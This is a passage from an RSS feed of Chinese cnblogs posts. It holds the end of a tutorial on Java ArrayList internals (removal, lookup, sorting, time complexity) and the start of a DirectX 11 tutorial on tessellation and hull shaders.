&lt;p&gt;该方法返回要删除的元素，真正的删除操作在 &lt;code&gt;fastRemove(es, index)&lt;/code&gt; 方法中。&lt;/p&gt;
&lt;p&gt;再来看 &lt;code&gt;remove(Object o)&lt;/code&gt; 方法的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object o)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; Object[] es = elementData;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; size = &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.size;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;br/&gt;found: {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (o == &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (; i &amp;lt; size; i++)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (es[i] == &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; found;&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (; i &amp;lt; size; i++)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (o.equals(es[i]))&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; found;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;fastRemove(es, i);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法通过 break label 的方式找到要删除元素（null 的时候使用 == 操作符判断，非 null 的时候使用 &lt;code&gt;equals()&lt;/code&gt; 方法，意味着如果有相同元素时，删除第一个）的下标，然后调用 &lt;code&gt;fastRemove()&lt;/code&gt; 方法。&lt;/p&gt;
&lt;p&gt;既然都调用了 &lt;code&gt;fastRemove()&lt;/code&gt; 方法，那就继续来跟踪一下源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;fastRemove&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object[] es, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;modCount++;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; newSize;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; ((newSize = size - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) &amp;gt; i)&lt;br/&gt;System.arraycopy(es, i + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, es, i, newSize - i);&lt;br/&gt;es[size = newSize] = &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当删除的是末尾的元素时，不需要复制数组，直接把末尾的元素赋值为 null 即可；否则的话，就需要调用 &lt;code&gt;System.arraycopy()&lt;/code&gt; 对数组进行复制。参照文章一开头提到的第三张、第四张图片。&lt;/p&gt;
&lt;h3 id=&quot;h05arraylist&quot;&gt;&lt;span&gt;05、查找 ArrayList 中的元素&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;如果要正序查找一个元素，可以使用 &lt;code&gt;indexOf()&lt;/code&gt; 方法；如果要倒序查找一个元素，可以使用 &lt;code&gt;lastIndexOf()&lt;/code&gt; 方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;alist.indexOf(&lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王二&quot;&lt;/span&gt;);&lt;br/&gt;alist.lastIndexOf(&lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王二&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;来看一下 &lt;code&gt;indexOf()&lt;/code&gt; 方法的源码：&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;java language-java hljs&quot; readability=&quot;6&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object o)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; indexOfRange(o, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, size);&lt;br/&gt;}&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;indexOfRange&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object o, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; start, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; end)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;Object[] es = elementData;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (o == &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = start; i &amp;lt; end; i++) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (es[i] == &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; i;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = start; i &amp;lt; end; i++) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (o.equals(es[i])) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; i;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果元素为 null 的时候使用“==”操作符，否则使用 &lt;code&gt;equals()&lt;/code&gt; 方法——该方法不是 null 安全的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lastIndexOf()&lt;/code&gt; 方法和 &lt;code&gt;indexOf()&lt;/code&gt; 方法类似，不过遍历的时候从最后开始。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;contains()&lt;/code&gt; 方法可以判断 ArrayList 中是否包含某个元素，其内部调用了 &lt;code&gt;indexOf()&lt;/code&gt; 方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object o)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; indexOf(o) &amp;gt;= &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果 ArrayList 中的元素是经过排序的，就可以使用二分查找法，效率更快。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Collections&lt;/code&gt; 类的 &lt;code&gt;sort()&lt;/code&gt; 方法可以对 ArrayList 进行排序，该方法会按照字母顺序对 String 类型的列表进行排序。如果是自定义类型的列表，还可以指定 Comparator 进行排序。&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;java language-java hljs&quot; readability=&quot;2&quot;&gt;List&amp;lt;String&amp;gt; copy = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;(alist);&lt;br/&gt;copy.add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;a&quot;&lt;/span&gt;);&lt;br/&gt;copy.add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;);&lt;br/&gt;copy.add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;);&lt;br/&gt;copy.add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;d&quot;&lt;/span&gt;);&lt;p&gt;Collections.sort(copy);&lt;br/&gt;System.out.println(copy);&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs json&quot;&gt;[a, b, c, d]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;排序后就可以使用二分查找法了：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; index = Collections.binarySearch(copy, &lt;span class=&quot;hljs-string&quot;&gt;&quot;b&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h06&quot;&gt;&lt;span&gt;06、最后&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;关于 ArrayList，就先介绍这么多吧，通过源码的角度，我想小伙伴们一定对 ArrayList 有了更深刻的印象。&lt;/p&gt;
&lt;p&gt;简单总结一下 ArrayList 的时间复杂度，方便后面学习 LinkedList 时作为一个对比。&lt;/p&gt;
&lt;p&gt;1）通过下标（也就是 &lt;code&gt;get(int index)&lt;/code&gt;）访问一个元素的时间复杂度为 O(1)，因为是直达的，无论数据增大多少倍，耗时都不变。&lt;/p&gt;
&lt;p&gt;2）添加一个元素（也就是 &lt;code&gt;add()&lt;/code&gt;）的时间复杂度为 O(1)，因为直接添加到末尾。&lt;/p&gt;
&lt;p&gt;3）删除一个元素的时间复杂度为 O(n)，因为要遍历列表，数据量增大几倍，耗时也增大几倍。&lt;/p&gt;
&lt;p&gt;4）查找一个未排序的列表时间复杂度为 O(n)，因为要遍历列表；查找排序过的列表时间复杂度为 O(log n)，因为可以使用二分查找法，当数据增大 n 倍时，耗时增大 logn 倍（这里的 log 是以 2 为底的，每找一次排除一半的可能）。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;我是沉默王二，一枚有颜值却靠才华苟且的程序员。&lt;strong&gt;关注即可提升学习效率，别忘了三连啊，点赞、收藏、留言，我不挑，奥利给&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;注：如果文章有任何问题，欢迎毫不留情地指正。&lt;/p&gt;
&lt;p&gt;很多读者都同情我说，“二哥，你像母猪似的日更原创累不累？”我只能说写作不易，且行且珍惜啊，关键是我真的喜欢写作。最后，欢迎微信搜索「&lt;strong&gt;沉默王二&lt;/strong&gt;」第一时间阅读，回复「&lt;strong&gt;简历&lt;/strong&gt;」更有阿里大佬的简历模板，本文 &lt;strong&gt;GitHub&lt;/strong&gt; &lt;a href=&quot;https://github.com/qinggee/itwanger.github.io&quot;&gt;github.com/itwanger&lt;/a&gt; 已收录，欢迎 star。&lt;/p&gt;
</description>
<pubDate>Sat, 11 Jul 2020 22:17:00 +0000</pubDate>
<dc:creator>沉默王二</dc:creator>
<og:description>先看再点赞，给自己一点思考的时间，思考过后请毫不犹豫微信搜索【沉默王二】，关注这个长发飘飘却靠才华苟且的程序员。本文 GitHub github.com/itwanger 已收录，里面还有技术大佬整理</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/qing-gee/p/13286907.html</dc:identifier>
</item>
<item>
<title>DirectX11 With Windows SDK--33 曲面细分阶段(Tessellation) - X_Jun</title>
<link>http://www.cnblogs.com/X-Jun/p/13286441.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/X-Jun/p/13286441.html</guid>
<description>&lt;p&gt;曲面细分是Direct3D 11带来的其中一项重要的新功能。它引入了两个可编程着色器阶段以及一个固定的镶嵌处理过程。简单来说，曲面细分技术可以将几何体细分为更小的三角形，并以某种方式把这些新生成的顶点偏移到合适的位置，从而以增加三角形数量的方式丰富网格细节。但为什么不在创建网格之初就直接赋予它高模（high-poly，高面数多边形）的细节呢？以下是使用曲面细分的3个理由：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;基于GPU实现动态LOD（Level of Detail，细节级别）。可以根据网格与摄像机的距离或依据其他因素来调整其细节。比如说，若网格离摄像机过远，则按高模的规格对它进行渲染将是一种浪费，因为在那个距离我们根本看不清网格的所有细节。随着物体与摄像机之间距离的拉紧，我们就能连续地对它镶嵌细分，以增加物体的细节。&lt;/li&gt;
&lt;li&gt;物理模拟与动画特效。我们可以在低模（low-poly，低面数多边形）网格上执行物理模拟与动画特效的相关计算，再以镶嵌画处理手段来获取细节上更加丰富的网格。这种降低物理模拟与动画特效计算量的做法能够节省不少的计算资源。&lt;/li&gt;
&lt;li&gt;节约内存。我们可以在各种存储器（磁盘、RAM、VRAM）中保存低模网格，再根据需求用GPU动态地对网格进行镶嵌细分。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;曲面细分技术涉及到的三个阶段都是可选的，但如果要使用曲面细分，这三个阶段都是必须要经历的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1172605/202007/1172605-20200712011345894-515605456.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;学习目标：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;了解曲面细分所用的面片图元类型。&lt;/li&gt;
&lt;li&gt;理解曲面细分阶段中的每个步骤都做了什么，它们所需的输入及输出又分别是哪种数据&lt;/li&gt;
&lt;li&gt;通过编写外壳着色器与域着色器程序来对几何图形进行镶嵌化细分&lt;/li&gt;
&lt;li&gt;熟悉不同的细分策略，以便于在镶嵌化处理的时候选择出最适当的方案。除此之外，还需要了解硬件曲面细分的性能&lt;/li&gt;
&lt;li&gt;学习贝塞尔曲线与贝塞尔曲面的数学描述，并在曲面细分阶段将它们予以实现&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.cnblogs.com/X-Jun/p/9028764.html&quot;&gt;DirectX11 With Windows SDK完整目录&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/MKXJun/DirectX11-With-Windows-SDK&quot;&gt;Github项目源码&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;欢迎加入QQ群: 727623616 可以一起探讨DX11，以及有什么问题也可以在这里汇报。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在进行曲面细分时，我们并不向IA（输入装配）阶段提交三角形，而是提交具有若干&lt;strong&gt;控制点&lt;/strong&gt;的&lt;strong&gt;面片&lt;/strong&gt;。Direct3D支持具有1~32个控制点的面片，并以下列图元类型进行描述：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;D3D_PRIMITIVE_TOPOLOGY_1_CONTROL_POINT_PATCHLIST        = 33,
D3D_PRIMITIVE_TOPOLOGY_2_CONTROL_POINT_PATCHLIST        = 34,
D3D_PRIMITIVE_TOPOLOGY_3_CONTROL_POINT_PATCHLIST        = 35,
...
D3D_PRIMITIVE_TOPOLOGY_31_CONTROL_POINT_PATCHLIST       = 63,
D3D_PRIMITIVE_TOPOLOGY_32_CONTROL_POINT_PATCHLIST       = 64,
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于可以将三角形看作是拥有3个控制点的三角形面片（&lt;code&gt;D3D_PRIMITIVE_TOPOLOGY_3_CONTROL_POINT_PATCHLIST&lt;/code&gt;），所以我们依然可以提交需要镶嵌化处理的普通三角形网格。对于简单的四边形面片而言，则只需要提交4个控制点的面片（D3D_PRIMITIVE_4_CONTROL_POINT_PATCH）即可。这些面片最终也会在曲面细分阶段经过镶嵌化处理而分解为多个三角形。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：&lt;code&gt;D3D_PRIMITIVE_TOPOLOGY&lt;/code&gt;枚举项描述输入装配阶段中的顶点类型，而&lt;code&gt;D3D_PRIMITIVE&lt;/code&gt;枚举项则描述的是外壳着色器的输入图元类型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么，具有更多控制点的面片又有什么用处呢？控制点的概念来自于特定种类数学角度上特定曲线或曲面的构造过程。如果在类似于Adobe Illustrator这样的绘图程序中使用过贝塞尔曲线工具，那读者一定会知道要通过控制点才能描绘出曲线形状。在数学上，可以利用贝塞尔曲线来生成贝塞尔曲面。举个例子，我们可以用9个控制点或16个控制点来创建一个贝塞尔四边形面片，所用的控制点越多，我们对面片形状的控制也就越随心所欲。因此，这一切图元控制类型都是为了给这些不同种类的曲线、曲面的绘制提供支持。&lt;/p&gt;
&lt;h2 id=&quot;曲面细分与顶点着色器&quot;&gt;曲面细分与顶点着色器&lt;/h2&gt;
&lt;p&gt;在我们向渲染管线提交了面片的控制点后，它们就会被推送至顶点着色器。这样一来，在开始曲面细分的时候，顶点着色器就彻底沦为“处理控制点的着色器”。正因为如此，我们还能在曲面细分开始之前，对控制点进行一些调整。一般来说，动画与物理模拟的计算工作都会在对几何体进行镶嵌化处理之前的顶点着色器中以较低的频次进行（镶嵌化处理之后，顶点增多，处理的频次也将随之增加）。&lt;/p&gt;

&lt;p&gt;外壳着色器是由&lt;strong&gt;两种着色器共同组成&lt;/strong&gt;的：&lt;strong&gt;常量外壳着色器（Constant Hull Shader）&lt;/strong&gt;和&lt;strong&gt;控制点外壳着色器（Control Point Hull Shader）&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;常量外壳着色器&quot;&gt;常量外壳着色器&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;常量外壳着色器&lt;/strong&gt;会针对每个面片统一进行处理（即每处理一个面片就被调用一次）。它的任务是输出&lt;strong&gt;当前网格&lt;/strong&gt;的&lt;strong&gt;曲面细分因子&lt;/strong&gt;，而且必须要输出。曲面细分因子指示了在曲面细分阶段中将面片镶嵌处理后的份数，以及怎么进行细分。它由两个输出系统值所表示：&lt;code&gt;SV_TessFactor&lt;/code&gt;和&lt;code&gt;SV_InsideTessFactor&lt;/code&gt;，这两个系统值属于float或float数组的类型，具体取决于输入装配阶段定义的图元类型。常量外壳着色器的输出被限制在128个标量（如32个4D单精度浮点向量），这意味着除了系统值，你还可以额外添加输出信息供每个面片所使用。下面是一个具有3个控制点的&lt;strong&gt;四边形面片&lt;/strong&gt;示例，我们通过常量缓冲区来为其设置各个方面的细分程度：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;struct QuadPatchTess
{
    float EdgeTess[4] : SV_TessFactor;
    float InsideTess[2] : SV_InsideTessFactor;
    
    // 可以在下面为每个面片附加所需的额外信息
};

QuadPatchTess QuadConstantHS(InputPatch&amp;lt;VertexOut, 4&amp;gt; patch, uint patchID : SV_PrimitiveID)
{
    QuadPatchTess pt;
    
    pt.EdgeTess[0] = g_QuadEdgeTess[0];                 // 四边形面片的左侧边缘
    pt.EdgeTess[1] = g_QuadEdgeTess[1];                 // 四边形面片的上侧边缘
    pt.EdgeTess[2] = g_QuadEdgeTess[2];                 // 四边形面片的右侧边缘
    pt.EdgeTess[3] = g_QuadEdgeTess[3];                 // 四边形面片的下册边缘
    pt.InsideTess[0] = g_QuadInsideTess[0];             // u轴(四边形内部细分的列数)
    pt.InsideTess[1] = g_QuadInsideTess[1];             // v轴(四边形内部细分的行数)
    
    return pt;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中&lt;code&gt;InputPatch&amp;lt;VertexOut, 4&amp;gt;&lt;/code&gt;定义了控制点的数目和信息。前面提到，控制点首先会传至顶点着色器，因此它们的类型由顶点着色器的输出类型&lt;code&gt;VertexOut&lt;/code&gt;来确定。在此例中，我们的面片拥有4个控制点，所以就将&lt;code&gt;InputPatch&lt;/code&gt;模板第二个参数指定为4。系统还通过&lt;code&gt;SV_PrimitiveID&lt;/code&gt;语义提供了面片的ID值，此ID唯一地标识了绘制调用过程中的各个面片，我们可以根据具体的需求来运用它。&lt;/p&gt;
&lt;p&gt;但按左上右下的顺序来控制边缘细分是建立在使用下面的顶点摆放顺序而言的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;XMFLOAT3 quadVertices[4] = {
    XMFLOAT3(-0.54f, 0.72f, 0.0f),      // 左上角
    XMFLOAT3(0.54f, 0.72f, 0.0f),       // 右上角
    XMFLOAT3(-0.54f, -0.72f, 0.0f),     // 左下角
    XMFLOAT3(0.54f, -0.72f, 0.0f)       // 右下角
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对&lt;strong&gt;四边形面片（quad）&lt;/strong&gt;进行镶嵌化处理的过程由两个构成：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;4个边缘曲面细分因子控制着对应边缘镶嵌后的份数&lt;/li&gt;
&lt;li&gt;两个内部曲面细分因子指示了如何来对该四边形面片的内部进行镶嵌化处理（其中一个针对四边形的横向维度，另一个则作用于四边形的纵向维度）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;对&lt;strong&gt;三角形面片（tri）&lt;/strong&gt;进行镶嵌化处理的过程同样分为两部分：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;3个边缘曲面细分因子控制着对应边缘镶嵌后的份数&lt;/li&gt;
&lt;li&gt;一个内部曲面细分因子指示着三角形面片内部的镶嵌份数。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;对&lt;strong&gt;等值线（isoline）&lt;/strong&gt;进行镶嵌化处理的过程如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;2个边缘细分因子控制着等值线如何进行镶嵌。第一个值暂时不知道作用（忽略），第二个用于控制两个相邻控制点之间分成多少段。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Direct3D 11硬件所支持的最大曲面细分因子为64（&lt;code&gt;D3D11_TESSELLATOR_MAX_TESSELLATION_FACTOR&lt;/code&gt;）.如果把所有的曲面细分因子都设置为0，则该面片会被后续的处理阶段所丢弃。这就使得我们能够以每个面片为基准来实现如视锥体剔除与背面剔除这类优化。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果面片根本没有出现在视锥体范围内，那么就能将它从后续的处理中丢弃（倘若已经对该面片进行了镶嵌化处理，那么其细分后的各三角形将在三角形裁剪期间被抛弃）&lt;/li&gt;
&lt;li&gt;如果面片是背面朝向的，那么就能将其从后面的处理过程中丢弃（如果该面片已经过了镶嵌化处理，则其细分后的所有三角形会在光栅化阶段的背面剔除过程中被抛弃）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;一个问题自然而然地复现出来：到底应该执行几次镶嵌化处理才合适？前面提到，曲面细分的基本想法就是为了丰富网格的细节。但是，如果用户对此无感，我们就不需要对它增添细节了。以下是一些确定镶嵌次数的常用衡量标准。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;根据与摄像机之间的距离&lt;/strong&gt;：物体与摄像机的距离越远，能分辨的细节就越少。因此，我们在两者距离较远的时候渲染物体的低模版本，并随着两者逐渐接近而逐步对物体进行更加细致的镶嵌化细分。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根据占用屏幕的范围&lt;/strong&gt;：可以先估算出物体覆盖屏幕的像素个数。如果数量比较少，则渲染物体的低模版本。随着物体占用屏幕范围的增加，我们便可以逐渐增大镶嵌化细分因子。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根据三角形的朝向&lt;/strong&gt;：三角形相对于观察者的朝向也被纳入考虑的范畴之中。位于物体轮廓边线上的三角形势必比其他位置的三角形拥有更多的细节。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根据粗糙程度&lt;/strong&gt;：粗糙不平的表面较光滑的表面需要进行更为细致的曲面细分处理。通过对表面纹理进行检测可以预算出相应的粗糙度数据，继而来决定镶嵌化处理的次数。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;a href=&quot;https://developer.download.nvidia.cn/presentations/2010/gdc/Tessellation_Performance.pdf&quot;&gt;[Story10(可点击)]&lt;/a&gt;给出了以下几点关于性能的建议。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果曲面细分因子为1（这个数字意味着该面片不必细分），那么就考虑在渲染此面片时不对它进行细分处理；否则，便会在曲面细分阶段白白浪费GPU资源，因为在此阶段并不对其执行任何操作。&lt;/li&gt;
&lt;li&gt;考虑到性能又涉及GPU对曲面细分的具体实现，所以不要对小于8个像素这种过小的三角形进行镶嵌化处理。&lt;/li&gt;
&lt;li&gt;使用曲面细分技术时要采用批绘制调用（batch draw call，即尽量将曲面细分任务集中执行）（在绘制调用之间往复开启、关闭曲面细分功能的代价极其高昂）。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;控制点外壳着色器&quot;&gt;控制点外壳着色器&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;控制点外壳着色器&lt;/strong&gt;以大量的控制点作为输入与输出，顶点着色器每输出一个控制点，此着色器都会被调用一次。控制点外壳着色器的应用之一是改变曲面的表示方式，比如把一个普通的三角形（向渲染管线提交的3个控制点）转换为3次贝塞尔三角形面片。例如，假设我们像平常那样利用三角形对网格进行建模，就可以通过控制点外壳着色器，把这些三角形转换为具有10个控制点的高阶三次贝塞尔三角形面片。新增的控制点不仅会带来更加丰富的细节，而且能将三角形面片镶嵌细分为用户所期望的份数。这一策略被称之为&lt;strong&gt;N-patches方法&lt;/strong&gt;（法线—面片方法，normal-patches scheme）或&lt;strong&gt;PN三角形方法&lt;/strong&gt;（即（曲面）点—法线三角形方法，point-normal triangles，简写为PN triangles scheme）&lt;a href=&quot;http://www.cs.jhu.edu/~misha/ReadingSeminar/Papers/Vlachos00.pdf&quot;&gt;[Vlachos]&lt;/a&gt;。由于这种方案只需用曲面细分技术来改进存在的三角形网格，且无需改动美术制作流程，所以实现起来比较方便。对于本章前面两个演示案例来说，控制点外壳着色器仅充当一个简单的&lt;strong&gt;传递着色器&lt;/strong&gt;，它不会对控制点进行任何的修改。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：驱动程序可能会对传递着色器进行检测与优化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;struct VertexOut
{
    float3 PosL : POSITION;
};

typedef VertexOut HullOut;

// Tessellation_Quad_Integer_HS.hlsl

[domain(&quot;quad&quot;)]
[partitioning(&quot;integer&quot;)]
[outputtopology(&quot;triangle_cw&quot;)]
[outputcontrolpoints(4)]
[patchconstantfunc(&quot;QuadConstantHS&quot;)]
[maxtessfactor(64.0f)]
float3 HS(InputPatch&amp;lt;VertexOut, 4&amp;gt; patch, uint i : SV_OutputControlPointID, uint patchId : SV_PrimitiveID) : POSITION
{
    return patch[i].PosL;
}

&lt;/code&gt;
&lt;/pre&gt;
